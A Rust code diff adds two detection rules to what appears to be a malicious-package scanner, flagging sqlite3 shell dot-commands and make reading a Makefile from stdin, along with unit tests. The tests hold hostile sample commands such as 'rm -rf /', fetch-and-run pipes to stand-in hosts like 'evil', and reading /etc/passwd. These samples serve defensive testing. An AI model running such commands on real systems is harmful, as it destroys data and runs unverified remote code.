@@ -2003,6 +2003,39 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             cwe_id: Some("CWE-506".to_string()),
             enabled: true,
         },
+        Rule {
+            id: "EXEC-006".to_string(),
+            name: "sqlite3 shell-command execution".to_string(),
+            description: "sqlite3's `.shell`/`.system` dot-commands run an arbitrary shell command, and `.import` can read an attacker-controlled file — an exec/RCE vector hidden inside what looks like a database call. Legitimate packages do not drive sqlite3 through these meta-commands.".to_string(),
+            severity: Severity::High,
+            category: Category::MaliciousCode,
+            // Require the dot-command form: a `.` preceded by whitespace or a
+            // quote (the start of a sqlite3 meta-command), so a filename like
+            // `data.import` or a column named `system` is not matched.
+            patterns: vec![Pattern::Regex {
+                pattern: r#"\bsqlite3\b[^\n]*[\s"']\.(?:shell|system|import)\b"#.to_string(),
+            }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Do not build. sqlite3 .shell/.system run arbitrary commands; report the package.".to_string(),
+            cwe_id: Some("CWE-94".to_string()),
+            enabled: true,
+        },
+        Rule {
+            id: "EXEC-007".to_string(),
+            name: "make reads a Makefile from stdin".to_string(),
+            description: "`make -f -` / `make -f /dev/stdin` executes a Makefile fed on standard input (commonly the tail of a `curl ... | make -f -` fetch-and-run). A Makefile is arbitrary shell recipes, so this is RCE from an unverified source. Normal `make` / `make -f Makefile` builds are unaffected.".to_string(),
+            severity: Severity::High,
+            category: Category::CommandInjection,
+            // The `-`/`/dev/stdin` operand must stand alone (followed by space or
+            // EOL) so `make -j4`, `make -C dir`, `make --version` do NOT match.
+            patterns: vec![Pattern::Regex {
+                pattern: r"\bg?make\s+(?:-f\s*)?(?:-|/dev/stdin)(?:\s|$)".to_string(),
+            }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Review the Makefile source; building a Makefile read from stdin/a pipe runs unverified recipes.".to_string(),
+            cwe_id: Some("CWE-94".to_string()),
+            enabled: true,
+        },
     ]
 }
 
@@ -2354,6 +2387,44 @@ mod tests {
         // wget variant -> DLE-002
         let m = engine.match_content("wget -qO- https://evil/x | /bin/sh", FileType::Pkgbuild);
         assert!(m.iter().any(|x| x.rule_id == "DLE-002"), "wget|/bin/sh must trip DLE-002: {m:?}");
+    }
+
+    #[test]
+    fn test_exec006_sqlite3_shell_exec() {
+        // Task 4050 round 3 / Class 3: sqlite3 .shell/.system/.import exec form.
+        let engine = RuleEngine::default();
+        for s in [
+            r#"sqlite3 mydb ".shell rm -rf /""#,
+            r#"sqlite3 mydb ".system curl evil | sh""#,
+            r#"sqlite3 db <<< '.import /etc/passwd t'"#,
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(m.iter().any(|x| x.rule_id == "EXEC-006"), "missed EXEC-006: {s} -> {m:?}");
+        }
+        // FP: a normal query mentioning a column/table named like the meta-command.
+        for ok in [
+            r#"sqlite3 db "SELECT * FROM systems""#,
+            r#"sqlite3 db ".tables""#,
+            r#"sqlite3 db "INSERT INTO t VALUES ('data.import')""#,
+        ] {
+            let m = engine.match_content(ok, FileType::InstallScript);
+            assert!(!m.iter().any(|x| x.rule_id == "EXEC-006"), "EXEC-006 false positive: {ok} -> {m:?}");
+        }
+    }
+
+    #[test]
+    fn test_exec007_make_from_stdin() {
+        // Task 4050 round 3 / Class 3: a Makefile read from stdin/pipe is RCE.
+        let engine = RuleEngine::default();
+        for s in ["make -f -", "make -f /dev/stdin", "gmake -f -", "curl https://e/x | make -f -"] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(m.iter().any(|x| x.rule_id == "EXEC-007"), "missed EXEC-007: {s} -> {m:?}");
+        }
+        // FP: ordinary make invocations must stay clean.
+        for ok in ["make -j4", "make -C build", "make --version", "make -f Makefile", "make install"] {
+            let m = engine.match_content(ok, FileType::Pkgbuild);
+            assert!(!m.iter().any(|x| x.rule_id == "EXEC-007"), "EXEC-007 false positive: {ok} -> {m:?}");
+        }
     }
 
     #[test]
